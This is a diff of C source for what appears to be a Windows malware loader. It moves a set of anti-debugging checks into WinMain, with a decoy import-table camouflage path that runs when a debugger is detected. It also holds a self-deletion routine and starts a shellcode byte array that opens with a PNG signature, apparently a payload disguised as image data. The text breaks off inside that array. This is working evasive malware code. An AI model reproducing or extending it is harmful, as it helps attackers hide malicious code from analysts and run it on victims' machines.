@@ -9,21 +9,6 @@
 
 static INT GoodFunction() {
 	
-	BOOL debuggerDetected = FALSE;
-	debuggerDetected |= CheckIsDebuggerPresent();
-	debuggerDetected |= CheckRemoteDebugger();
-	debuggerDetected |= CheckProcessDebugFlags();
-	debuggerDetected |= CheckProcessDebugPort();
-	debuggerDetected |= CheckTimingAnomaly();
-	debuggerDetected |= CheckHardwareBreakpoints();
-	debuggerDetected |= CheckUsingExceptions();
-
-	if (debuggerDetected)
-	{
-		IatCamouflage();
-		return 0;
-	}
-	else {
 		InitializeSysCalls();
 		InitializeRandomValue();
 		InitializeModules();
@@ -66,7 +51,6 @@ static INT GoodFunction() {
 		return 0;
 
 	}
-}
 
 BOOL SelfDeletion() {
 	PFILE_RENAME_INFO pRenameInfo = NULL;
@@ -116,6 +100,23 @@ BOOL SelfDeletion() {
 }
 
 int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {
+	
+	BOOL debuggerDetected = FALSE;
+	debuggerDetected |= CheckIsDebuggerPresent();
+	debuggerDetected |= CheckRemoteDebugger();
+	debuggerDetected |= CheckProcessDebugFlags();
+	debuggerDetected |= CheckProcessDebugPort();
+	debuggerDetected |= CheckTimingAnomaly();
+	debuggerDetected |= CheckHardwareBreakpoints();
+	debuggerDetected |= CheckUsingExceptions();
+
+	if (debuggerDetected)
+	{
+		IatCamouflage();
+		return 0;
+	}
+
+
 	BYTE shellcode1[] =  {
   0x89, 0x50, 0x4e, 0x47, 0x0d, 0x0a, 0x1a, 0x0a, 0x00, 0x00, 0x00, 0x0d,
   0x49, 0x48, 0x44, 0x52, 0x00, 0x00, 0x05, 0x00, 0x00, 0x00, 0x02, 0xd0,
